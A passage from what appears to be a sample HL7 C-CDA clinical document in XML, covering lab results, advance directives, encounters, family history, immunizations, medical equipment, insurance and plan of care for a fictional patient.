									<td>8.1</td>
								</tr>
								<tr>
									<td colspan="2">ELECTROCARDIOGRAM (EKG) INFORMATION</td>
								</tr>
								<tr>
									<td>EKG</td>
									<td>Sinus rhythm without acute changes</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<organizer classCode="BATTERY" moodCode="EVN">
							<!-- Result organizer template -->
							<templateId root="2.16.840.1.113883.10.20.22.4.1"/>
							<id root="7d5a02b0-67a4-11db-bd13-0800200c9a66"/>
							<code code="43789009" displayName="CBC WO DIFFERENTIAL" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
							<statusCode code="completed"/>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<!-- Result observation template -->
									<templateId root="2.16.840.1.113883.10.20.22.4.2"/>
									<id root="107c2dc0-67a5-11db-bd13-0800200c9a66"/>
									<code code="30313-1" displayName="HGB" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC">
										<originalText>
											<reference value="#result1"/>
										</originalText>
									</code>
									<statusCode code="completed"/>
									<effectiveTime value="200003231430"/>
									<value xsi:type="PQ" value="13.2" unit="g/dl"/>
									<interpretationCode code="N" codeSystem="2.16.840.1.113883.5.83"/>
									<methodCode/>
									<targetSiteCode/>
									<author>
										<time/>
										<assignedAuthor>
											<id/>
										</assignedAuthor>
									</author>
									<referenceRange>
										<observationRange>
											<text>M 13-18 g/dl; F 12-16 g/dl</text>
										</observationRange>
									</referenceRange>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<!-- Result observation template -->
									<templateId root="2.16.840.1.113883.10.20.22.4.2"/>
									<id root="107c2dc0-67a5-11db-bd13-0800200c9a66"/>
									<code code="33765-9" displayName="WBC" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC">
										<originalText>
											<reference value="#result2"/>
										</originalText>
									</code>
									<statusCode code="completed"/>
									<effectiveTime value="200003231430"/>
									<value xsi:type="PQ" value="6.7" unit="10+3/ul"/>
									<interpretationCode code="N" codeSystem="2.16.840.1.113883.5.83"/>
									<methodCode/>
									<targetSiteCode/>
									<author>
										<time/>
										<assignedAuthor>
											<id/>
										</assignedAuthor>
									</author>
									<referenceRange>
										<observationRange>
											<value xsi:type="IVL_PQ">
												<low value="4.3" unit="10+3/ul"/>
												<high value="10.8" unit="10+3/ul"/>
											</value>
										</observationRange>
									</referenceRange>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<!-- Result observation template -->
									<templateId root="2.16.840.1.113883.10.20.22.4.2"/>
									<id root="107c2dc0-67a5-11db-bd13-0800200c9a66"/>
									<code code="26515-7" displayName="PLT" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC">
										<originalText>
											<reference value="#result3"/>
										</originalText>
									</code>
									<statusCode code="completed"/>
									<effectiveTime value="200003231430"/>
									<value xsi:type="PQ" value="123" unit="10+3/ul"/>
									<interpretationCode code="L" codeSystem="2.16.840.1.113883.5.83"/>
									<methodCode/>
									<targetSiteCode/>
									<author>
										<time/>
										<assignedAuthor>
											<id/>
										</assignedAuthor>
									</author>
									<referenceRange>
										<observationRange>
											<value xsi:type="IVL_PQ">
												<low value="150" unit="10+3/ul"/>
												<high value="350" unit="10+3/ul"/>
											</value>
										</observationRange>
									</referenceRange>
								</observation>
							</component>
						</organizer>
					</entry>
				</section>
			</component>
			<!--

********************************************************

ADVANCE DIRECTIVES

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.21.1"/>
					<title>Advance Directives</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Directive</th>
									<th>Description</th>
									<th>Verification</th>
									<th>Supporting Document(s)</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Resuscitation status</td>
									<td>
										<content ID="AD1">Do not resuscitate</content>
									</td>
									<td>Dr. Robert Dolin, Nov 07, 1999</td>
									<td>
										<linkHtml href="AdvanceDirective.b50b7910-7ffb-4f4c-bbe4-177ed68cbbf3.pdf">Advance directive</linkHtml>
									</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry>
						<observation classCode="OBS" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.48"/>
							<!-- ** Advance Directive Observation ** -->
							<id root="9b54c3c9-1673-49c7-aef9-b037ed72ed27"/>
							<code code="304251008" codeSystem="2.16.840.1.113883.6.96" displayName="Resuscitation"/>
							<statusCode code="completed"/>
							<effectiveTime>
								<low value="20110213"/>
								<high nullFlavor="NA"/>
							</effectiveTime>
							<value xsi:type="CD" code="304253006" codeSystem="2.16.840.1.113883.6.96" displayName="Do not resuscitate">
								<originalText>
									<reference value="#AD1"/>
								</originalText>
							</value>
							<participant typeCode="VRF">
								<templateId root="2.16.840.1.113883.10.20.1.58"/>
								<time value="201102013"/>
								<participantRole>
									<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
									<playingEntity>
										<name>
											<prefix>Dr.</prefix>
											<family>Dolin</family>
											<given>Robert</given>
										</name>
									</playingEntity>
								</participantRole>
							</participant>
							<participant typeCode="CST">
								<participantRole classCode="AGNT">
									<addr>
										<streetAddressLine>21 North Ave.</streetAddressLine>
										<city>Burlington</city>
										<state>MA</state>
										<postalCode>02368</postalCode>
										<country>USA</country>
									</addr>
									<telecom value="tel:(555)555-1003"/>
									<playingEntity>
										<name>
											<prefix>Dr.</prefix>
											<family>Dolin</family>
											<given>Robert</given>
										</name>
									</playingEntity>
								</participantRole>
							</participant>
							<reference typeCode="REFR">
								<seperatableInd value="false"/>
								<externalDocument>
									<id root="b50b7910-7ffb-4f4c-bbe4-177ed68cbbf3"/>
									<text mediaType="application/pdf">
										<reference value="AdvanceDirective.b50b7910-7ffb-4f4c-bbe4-177ed68cbbf3.pdf"/>
									</text>
								</externalDocument>
							</reference>
						</observation>
					</entry>
				</section>
			</component>
			<!--

********************************************************

ENCOUNTERS

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.22.1"/>
					<!-- Encounters Section - required entries -->
					<code code="46240-8" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="History of encounters"/>
					<title>Encounters</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Encounter</th>
									<th>Performer</th>
									<th>Location</th>
									<th>Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>
										<content ID="Encounter1"/> Examination</td>
									<td>Performer Name</td>
									<td>Good Health Clinic</td>
									<td>Apr 07, 2000</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<encounter classCode="ENC" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.49"/>
							<!-- Encounter Activities -->
							<!--  ********  Encounter activity template   ******** -->
							<id root="2a620155-9d11-439e-92b3-5d9815ff4de8"/>
							<code code="99241" displayName="Office consultation - 15 minutes" codeSystemName="CPT" codeSystem="2.16.840.1.113883.6.12" codeSystemVersion="4">
								<originalText>Checkup Examination<reference value="#Encounter1"/>
								</originalText>
								<translation code="AMB" codeSystem="2.16.840.1.113883.5.4" displayName="Ambulatory" codeSystemName="HL7 ActEncounterCode"/>
							</code>
							<effectiveTime value="20000407"/>
							<performer>
								<assignedEntity>
									<id/>
									<code code="59058001" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="General Physician"/>
								</assignedEntity>
							</performer>
							<participant typeCode="LOC">
								<participantRole classCode="SDLOC">
									<templateId root="2.16.840.1.113883.10.20.22.4.32"/>
									<!-- Service Delivery Location template -->
									<code code="GACH" codeSystem="2.16.840.1.113883.5.111" codeSystemName="HL7 RoleCode" displayName="General Acute Care Hospital"/>
									<addr>
										<streetAddressLine>17 Daws Rd.</streetAddressLine>
										<city>Blue Bell</city>
										<state>MA</state>
										<postalCode>02368</postalCode>
										<country>US</country>
									</addr>
									<telecom nullFlavor="UNK"/>
									<playingEntity classCode="PLC">
										<name>Good Health Clinic</name>
									</playingEntity>
								</participantRole>
							</participant>
							<entryRelationship typeCode="RSON">
								<observation classCode="COND" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.19"/>
									<id root="db734647-fc99-424c-a864-7e3cda82e703" extension="45665"/>
									<code code="404684003" displayName="Finding" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
									<statusCode code="completed"/>
									<value xsi:type="CE" code="32398004" displayName="Bronchitis" codeSystem="2.16.840.1.113883.6.96"/>
								</observation>
							</entryRelationship>
						</encounter>
					</entry>
				</section>
			</component>
			<!--

********************************************************

FAMILY HISTORY

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.15"/>
					<!--  ********  Family history section template   ******** -->
					<code code="10157-6" codeSystem="2.16.840.1.113883.6.1"/>
					<title>Family history</title>
					<text>
						<paragraph>Father (deceased)</paragraph>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Diagnosis</th>
									<th>Age At Onset</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Myocardial Infarction (cause of death)</td>
									<td>57</td>
								</tr>
								<tr>
									<td>Diabetes</td>
									<td>40</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<organizer moodCode="EVN" classCode="CLUSTER">
							<templateId root="2.16.840.1.113883.10.20.22.4.45"/>
							<!--  ********  Family history organizer template   ******** -->
							<statusCode code="completed"/>
							<subject>
								<relatedSubject classCode="PRS">
									<code code="FTH" displayName="Father" codeSystemName="HL7 FamilyMember" codeSystem="2.16.840.1.113883.5.111">
										<translation code="9947008" displayName="Biological father" codeSystemName="SNOMED" codeSystem="2.16.840.1.113883.6.96"/>
									</code>
									<subject>
										<administrativeGenderCode code="M" codeSystem="2.16.840.1.113883.5.1" displayName="Male"/>
										<birthTime value="1912"/>
									</subject>
								</relatedSubject>
							</subject>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.46"/>
									<!-- Family History Observation template -->
									<id root="d42ebf70-5c89-11db-b0de-0800200c9a66"/>
									<code code="55561003" displayName="Active" codeSystemName="SNOMED CT" codeSystem="2.16.840.1.113883.6.96"/>
									<statusCode code="completed"/>
									<effectiveTime nullFlavor="UNK"/>
									<value xsi:type="CD" code="22298006" codeSystem="2.16.840.1.113883.6.96" displayName="Myocardial infarction"/>
									<entryRelationship typeCode="CAUS">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.47"/>
											<!--  ******** Family history death observation template   ******** -->
											<id root="6898fae0-5c8a-11db-b0de-0800200c9a66"/>
											<code code="ASSERTION" codeSystem="2.16.840.1.113883.5.4"/>
											<statusCode code="completed"/>
											<value xsi:type="CD" code="419099009" codeSystem="2.16.840.1.113883.6.96" displayName="Dead"/>
										</observation>
									</entryRelationship>
									<entryRelationship typeCode="SUBJ" inversionInd="true">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.31"/>
											<!--  ********  Age observation template   ******** -->
											<code code="397659008" codeSystem="2.16.840.1.113883.6.96" displayName="Age"/>
											<statusCode code="completed"/>
											<value xsi:type="PQ" value="57" unit="a"/>
										</observation>
									</entryRelationship>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.46"/>
									<!--  ********  Family history observation template   ******** -->
									<id root="5bfe3ec0-5c8b-11db-b0de-0800200c9a66"/>
									<code code="7087005" displayName="Intermittent" codeSystemName="SNOMED CT" codeSystem="2.16.840.1.113883.6.96"/>
									<statusCode code="completed"/>
									<effectiveTime value="1994"/>
									<value xsi:type="CD" code="46635009" codeSystem="2.16.840.1.113883.6.96" displayName="Diabetes mellitus type 1"/>
									<entryRelationship typeCode="SUBJ" inversionInd="true">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.31"/>
											<!--  ********  Age observation template   ******** -->
											<code code="397659008" codeSystem="2.16.840.1.113883.6.96" displayName="Age"/>
											<statusCode code="completed"/>
											<value xsi:type="PQ" value="40" unit="a"/>
										</observation>
									</entryRelationship>
								</observation>
							</component>
						</organizer>
					</entry>
				</section>
			</component>
			<!--

********************************************************

IMMUNIZATIONS

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.2"/>
					<!--  ********  Immunizations section template   ******** -->
					<code code="11369-6" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="History of immunizations"/>
					<title>Immunizations</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Vaccine</th>
									<th>Date</th>
									<th>Status</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>
										<content ID="immun1"/>Influenza virus vaccine, IM</td>
									<td>Nov 1999</td>
									<td>Completed</td>
								</tr>
								<tr>
									<td>
										<content ID="immun2"/>Influenza virus vaccine, IM</td>
									<td>Dec 1998</td>
									<td>Completed</td>
								</tr>
								<tr>
									<td>
										<content ID="immun3"/>Pneumococcal polysaccharide vaccine, IM</td>
									<td>Dec 1998</td>
									<td>Completed</td>
								</tr>
								<tr>
									<td>
										<content ID="immun4"/>Tetanus and diphtheria toxoids, IM</td>
									<td>1997</td>
									<td>Refused</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<substanceAdministration classCode="SBADM" moodCode="EVN" negationInd="false">
							<templateId root="2.16.840.1.113883.10.20.22.4.52"/>
							<!--  ********   Immunization activity template    ******** -->
							<id root="e6f1ba43-c0ed-4b9b-9f12-f435d8ad8f92"/>
							<text>
								<reference value="#immun1"/>
							</text>
							<statusCode code="completed"/>
							<effectiveTime xsi:type="IVL_TS" value="199911"/>
							<routeCode code="IM" codeSystem="2.16.840.1.113883.5.112" codeSystemName="RouteOfAdministration" displayName="Intramuscular injection"/>
							<doseQuantity nullFlavor="UNK"/>
							<consumable>
								<manufacturedProduct>
									<templateId root="2.16.840.1.113883.10.20.22.4.54"/>
									<!--  ********   Immunization Medication Information    ******** -->
									<manufacturedMaterial>
										<code code="88" codeSystem="2.16.840.1.113883.6.59" displayName="Influenza virus vaccine" codeSystemName="CVX">
											<originalText>Influenza virus vaccine</originalText>
											<translation code="111" displayName="influenza, live, intranasal" codeSystemName="CVX" codeSystem="2.16.840.1.113883.6.59"/>
										</code>
									</manufacturedMaterial>
								</manufacturedProduct>
							</consumable>
							<entryRelationship typeCode="SUBJ">
								<act classCode="ACT" moodCode="INT">
									<templateId root="2.16.840.1.113883.10.20.22.4.20"/>
									<!-- ** Instructions Template ** -->
									<code code="171044003" codeSystem="2.16.840.1.113883.6.96" displayName="immunization education"/>
									<text>Possible flu-like symptoms for three days.</text>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
						</substanceAdministration>
					</entry>
					<entry typeCode="DRIV">
						<substanceAdministration classCode="SBADM" moodCode="EVN" negationInd="false">
							<templateId root="2.16.840.1.113883.10.20.22.4.52"/>
							<!--  ********   Immunization activity template    ******** -->
							<id root="e6f1ba43-c0ed-4b9b-9f12-f435d8ad8f92"/>
							<text>
								<reference value="#immun2"/>
							</text>
							<statusCode code="completed"/>
							<effectiveTime xsi:type="IVL_TS" value="19981215"/>
							<routeCode code="IM" codeSystem="2.16.840.1.113883.5.112" codeSystemName="RouteOfAdministration" displayName="Intramuscular injection"/>
							<doseQuantity nullFlavor="UNK"/>
							<consumable>
								<manufacturedProduct>
									<templateId root="2.16.840.1.113883.10.20.22.4.54"/>
									<!--  ********   Immunization Medication Information    ******** -->
									<manufacturedMaterial>
										<code code="88" codeSystem="2.16.840.1.113883.6.59" displayName="Influenza virus vaccine" codeSystemName="CVX">
											<originalText>Influenza virus vaccine</originalText>
											<translation code="111" displayName="influenza, live, intranasal" codeSystemName="CVX" codeSystem="2.16.840.1.113883.6.59"/>
										</code>
									</manufacturedMaterial>
								</manufacturedProduct>
							</consumable>
							<entryRelationship typeCode="SUBJ">
								<act classCode="ACT" moodCode="INT">
									<templateId root="2.16.840.1.113883.10.20.22.4.20"/>
									<!-- ** Instructions Template ** -->
									<code code="171044003" codeSystem="2.16.840.1.113883.6.96" displayName="immunization education"/>
									<text>Possible flu-like symptoms for three days.</text>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
						</substanceAdministration>
					</entry>
					<entry typeCode="DRIV">
						<substanceAdministration classCode="SBADM" moodCode="EVN" negationInd="false">
							<templateId root="2.16.840.1.113883.10.20.22.4.52"/>
							<!--  ********   Immunization activity template    ******** -->
							<id root="e6f1ba43-c0ed-4b9b-9f12-f435d8ad8f92"/>
							<text>
								<reference value="#immun3"/>
							</text>
							<statusCode code="completed"/>
							<effectiveTime xsi:type="IVL_TS" value="19981215"/>
							<routeCode code="IM" codeSystem="2.16.840.1.113883.5.112" codeSystemName="RouteOfAdministration" displayName="Intramuscular injection"/>
							<doseQuantity nullFlavor="UNK"/>
							<consumable>
								<manufacturedProduct>
									<templateId root="2.16.840.1.113883.10.20.22.4.54"/>
									<!--  ********   Immunization Medication Information    ******** -->
									<manufacturedMaterial>
										<code code="33" codeSystem="2.16.840.1.113883.6.59" displayName="Pneumococcal polysaccharide vaccine" codeSystemName="CVX">
											<originalText>Influenza virus vaccine</originalText>
											<translation code="109" displayName="Pneumococcal NOS" codeSystemName="CVX" codeSystem="2.16.840.1.113883.6.59"/>
										</code>
									</manufacturedMaterial>
								</manufacturedProduct>
							</consumable>
							<entryRelationship typeCode="SUBJ">
								<act classCode="ACT" moodCode="INT">
									<templateId root="2.16.840.1.113883.10.20.22.4.20"/>
									<!-- ** Instructions Template ** -->
									<code code="171044003" codeSystem="2.16.840.1.113883.6.96" displayName="immunization education"/>
									<text>Possible flu-like symptoms for three days.</text>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
						</substanceAdministration>
					</entry>
					<entry typeCode="DRIV">
						<substanceAdministration classCode="SBADM" moodCode="EVN" negationInd="false">
							<templateId root="2.16.840.1.113883.10.20.22.4.52"/>
							<!--  ********   Immunization activity template    ******** -->
							<id root="e6f1ba43-c0ed-4b9b-9f12-f435d8ad8f92"/>
							<text>
								<reference value="#immun3"/>
							</text>
							<statusCode code="completed"/>
							<effectiveTime xsi:type="IVL_TS" value="19981215"/>
							<routeCode code="IM" codeSystem="2.16.840.1.113883.5.112" codeSystemName="RouteOfAdministration" displayName="Intramuscular injection"/>
							<doseQuantity nullFlavor="UNK"/>
							<consumable>
								<manufacturedProduct>
									<templateId root="2.16.840.1.113883.10.20.22.4.54"/>
									<!--  ********   Immunization Medication Information    ******** -->
									<manufacturedMaterial>
										<code code="103" codeSystem="2.16.840.1.113883.6.59" displayName="Tetanus and diphtheria toxoids - preservative free" codeSystemName="CVX">
											<originalText>Tetanus and diphtheria toxoids - preservative free</originalText>
											<translation code="09" displayName="Tetanus and diphtheria toxoids - preservative free" codeSystemName="CVX" codeSystem="2.16.840.1.113883.6.59"/>
										</code>
									</manufacturedMaterial>
								</manufacturedProduct>
							</consumable>
							<entryRelationship typeCode="SUBJ">
								<act classCode="ACT" moodCode="INT">
									<templateId root="2.16.840.1.113883.10.20.22.4.20"/>
									<!-- ** Instructions Template ** -->
									<code code="171044003" codeSystem="2.16.840.1.113883.6.96" displayName="immunization education"/>
									<text>Possible flu-like symptoms for three days.</text>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
							<entryRelationship typeCode="RSON">
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.53"/>
									<!-- Immunization Refusal -->
									<id/>
									<code displayName="Patient Objection" code="PATOBJ" codeSystemName="HL7 ActNoImmunizationReason" codeSystem="2.16.840.1.113883.11.19725"/>
									<statusCode code="completed"/>
								</observation>
							</entryRelationship>
						</substanceAdministration>
					</entry>
				</section>
			</component>
			<!--

********************************************************

MEDICAL EQUIPMENT

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.23"/>
					<!--  *** Medical equipment section template *** -->
					<code code="46264-8" codeSystem="2.16.840.1.113883.6.1"/>
					<title>Medical Equipment</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Supply/Device</th>
									<th>Date Supplied</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Automatic implantable cardioverter/defibrillator</td>
									<td>Nov 1999</td>
								</tr>
								<tr>
									<td>Total hip replacement prosthesis</td>
									<td>1998</td>
								</tr>
								<tr>
									<td>Wheelchair</td>
									<td>1999</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<supply classCode="SPLY" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.50"/>
							<!--  Non-medicinal supply activity template  ******* -->
							<id root="2413773c-2372-4299-bbe6-5b0f60664446"/>
							<statusCode code="completed"/>
							<effectiveTime xsi:type="IVL_TS">
								<high value="199911"/>
							</effectiveTime>
							<quantity value="2"/>
							<participant typeCode="PRD">
								<participantRole classCode="MANU">
									<templateId root="2.16.840.1.113883.10.20.22.4.37"/>
									<!--  ********  Product instance template   ******** -->
									<playingDevice>
										<code code="72506001" codeSystem="2.16.840.1.113883.6.96" displayName="Automatic implantable cardioverter/defibrillator"/>
									</playingDevice>
									<scopingEntity>
										<id root="eb936010-7b17-11db-9fe1-0800200c9b65"/>
									</scopingEntity>
								</participantRole>
							</participant>
						</supply>
					</entry>
					<entry typeCode="DRIV">
						<supply classCode="SPLY" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.50"/>
							<!--  ********  Non-medicinal supply activity template   ******** -->
							<id root="230b0ab7-206d-42d8-a947-ab4f63aad795"/>
							<statusCode code="completed"/>
							<effectiveTime xsi:type="IVL_TS">
								<center value="1998"/>
							</effectiveTime>
							<participant typeCode="DEV">
								<participantRole classCode="MANU">
									<templateId root="2.16.840.1.113883.10.20.22.4.37"/>
									<!--  ********  Product instance template   ******** -->
									<id root="03ca01b0-7be1-11db-9fe1-0800200c9a66"/>
									<addr/>
									<telecom/>
									<playingDevice>
										<code code="304120007" codeSystem="2.16.840.1.113883.6.96" displayName="Total hip replacement prosthesis"/>
									</playingDevice>
									<scopingEntity>
										<id root="0abea950-5b40-4b7e-b8d9-2a5ea3ac5500"/>
										<desc>Good Health Prostheses Company</desc>
									</scopingEntity>
								</participantRole>
							</participant>
						</supply>
					</entry>
					<entry typeCode="DRIV">
						<supply classCode="SPLY" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.50"/>
							<!--  ********  Non-medicinal supply activity template   ******** -->
							<id root="c4ffe98e-3cd3-4c54-b5bd-08ecb80379e0"/>
							<statusCode code="completed"/>
							<effectiveTime xsi:type="IVL_TS">
								<center value="1999"/>
							</effectiveTime>
							<participant typeCode="DEV">
								<participantRole classCode="MANU">
									<templateId root="2.16.840.1.113883.10.20.22.4.37"/>
									<!--  ********  Product instance template   ******** -->
									<addr/>
									<telecom/>
									<playingDevice>
										<code code="58938008" codeSystem="2.16.840.1.113883.6.96" displayName="Wheelchair"/>
									</playingDevice>
									<scopingEntity>
										<id root="eb936010-7b17-11db-9fe1-0800200c9b67"/>
									</scopingEntity>
								</participantRole>
							</participant>
						</supply>
					</entry>
				</section>
			</component>
			<!--

********************************************************

PAYERS

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.18"/>
					<!--  ******** Payers section template  ******** -->
					<code code="48768-6" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Payments"/>
					<title>Insurance Providers</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Payer name</th>
									<th>Policy type / Coverage type</th>
									<th>Policy ID</th>
									<th>Covered party ID</th>
									<th>Policy Holder</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Good Health Insurance</td>
									<td>Extended healthcare / Family</td>
									<td>Contract Number</td>
									<td>1138345</td>
									<td>Patient's Mother</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<act classCode="ACT" moodCode="DEF">
							<templateId root="2.16.840.1.113883.10.20.22.60"/>
							<!--  ********  Coverage entry template   ******** -->
							<id root="1fe2cdd0-7aad-11db-9fe1-0800200c9a66"/>
							<code code="48768-6" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Payment sources"/>
							<statusCode code="completed"/>
							<entryRelationship typeCode="COMP">
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.61"/>
									<!--  ******** Policy Activity template   ******** -->
									<id root="3e676a50-7aac-11db-9fe1-0800200c9a66"/>
									<code code="SELF" codeSystemName="HL7 RoleClassRelationship" codeSystem="2.16.840.1.113883.5.110">

									</code>
									<statusCode code="completed"/>
									<!-- Insurance Company Information -->
									<performer typeCode="PRF">
										<time/>
										<assignedEntity>
											<id root="2.16.840.1.113883.19"/>
											<code code="PAYOR" codeSystem="2.16.840.1.113883.5.110" codeSystemName="HL7 RoleClassRelationship"/>
											<addr use="WP">
												<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
												<streetAddressLine>123 Insurance Road</streetAddressLine>
												<city>Blue Bell</city>
												<state>MA</state>
												<postalCode>02368</postalCode>
												<country>US</country>
												<!-- US is "United States" from ISO 3166-1 Country Codes: 1.0.3166.1 -->
											</addr>
											<telecom value="tel:(781)555-1515" use="WP"/>
											<representedOrganization>
												<name>Good Health Insurance</name>
												<telecom/>
												<addr/>
											</representedOrganization>
										</assignedEntity>
									</performer>
									<!-- Guarantor Information.... The person responsible for the final bill. -->
									<performer typeCode="PRF">
										<time/>
										<assignedEntity>
											<id root="329fcdf0-7ab3-11db-9fe1-0800200c9a66"/>
											<code code="GUAR" codeSystem="2.16.840.1.113883.5.110" codeSystemName="HL7 RoleClassRelationship"/>
											<addr use="HP">
												<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
												<streetAddressLine>17 Daws Rd.</streetAddressLine>
												<city>Blue Bell</city>
												<state>MA</state>
												<postalCode>02368</postalCode>
												<country>US</country>
												<!-- US is "United States" from ISO 3166-1 Country Codes: 1.0.3166.1 -->
											</addr>
											<telecom value="tel:(781)555-1212" use="HP"/>
											<assignedPerson>
												<name>
													<prefix>Mr.</prefix>
													<given>Adam</given>
													<given>Frankie</given>
													<family>Everyman</family>
												</name>
											</assignedPerson>
										</assignedEntity>
									</performer>
									<participant typeCode="COV">
										<time>
											<low nullFlavor="UNK"/>
											<high nullFlavor="UNK"/>
										</time>
										<participantRole classCode="PAT">
											<id root="14d4a520-7aae-11db-9fe1-0800200c9a66" extension="1138345"/>
											<!-- Health plan ID for patient. -->
											<code code="SELF" codeSystem="2.16.840.1.113883.5.111" displayName="Self"/>
											<addr use="HP">
												<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
												<streetAddressLine>17 Daws Rd.</streetAddressLine>
												<city>Blue Bell</city>
												<state>MA</state>
												<postalCode>02368</postalCode>
												<country>US</country>
												<!-- US is "United States" from ISO 3166-1 Country Codes: 1.0.3166.1 -->
											</addr>
											<playingEntity>
												<name>
													<!-- Name is needed if different than health plan name. -->
													<prefix>Mr.</prefix>
													<given>Frank</given>
													<given>A.</given>
													<family>Everyman</family>
												</name>
											</playingEntity>
										</participantRole>
									</participant>
									<participant typeCode="HLD">
										<participantRole>
											<id extension="1138345" root="2.16.840.1.113883.19"/>
											<addr use="HP">
												<streetAddressLine>17 Daws Rd.</streetAddressLine>
												<city>Blue Bell</city>
												<state>MA</state>
												<postalCode>02368</postalCode>
												<country>US</country>
											</addr>
										</participantRole>
									</participant>
									<entryRelationship typeCode="REFR">
										<act classCode="ACT" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.1.19"/>
											<!--  ******** Authorization activity template   ******** -->
											<id root="f4dce790-8328-11db-9fe1-0800200c9a66"/>
											<code nullFlavor="NA"/>
											<entryRelationship typeCode="SUBJ">
												<procedure classCode="PROC" moodCode="PRMS">
													<code code="73761001" codeSystem="2.16.840.1.113883.6.96" displayName="Colonoscopy"/>
												</procedure>
											</entryRelationship>
										</act>
									</entryRelationship>
									<!-- The above entryRelationship OR the following.



									<entryRelationship typeCode="REFR">

										<act classCode="ACT" moodCode="DEF">

											<id root="f4dce790-8328-11db-9fe1-0800200c9a66"/>

											<code nullFlavor="UNK"/>

											<text>Health Plan Name<reference value="PntrToHealthPlanNameInSectionText"/>

											</text>

											<statusCode code="active"/>

										</act>

									</entryRelationship>

									

									-->
								</act>
							</entryRelationship>
						</act>
					</entry>
				</section>
			</component>
			<!--

********************************************************

PLAN OF CARE

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.10"/>
					<!--  **** Plan of Care section template  **** -->
					<code code="18776-5" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Treatment plan"/>
					<title>Plan of Care</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Planned Activity</th>
									<th>Planned Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Colonoscopy</td>
									<td>April 21, 2000</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<observation classCode="OBS" moodCode="RQO">
							<templateId root="2.16.840.1.113883.10.20.22.4.44"/>
							<!--   Plan of Care Activity Observation template   -->
							<id root="9a6d1bac-17d3-4195-89a4-1121bc809b4a"/>
							<code code="310634005" codeSystem="2.16.840.1.113883.6.96" displayName="Colonoscopy"/>
							<statusCode code="new"/>
							<effectiveTime>
								<center value="20000421"/>
							</effectiveTime>
						</observation>
					</entry>
					<entry>
						<act moodCode="RQO" classCode="ACT">
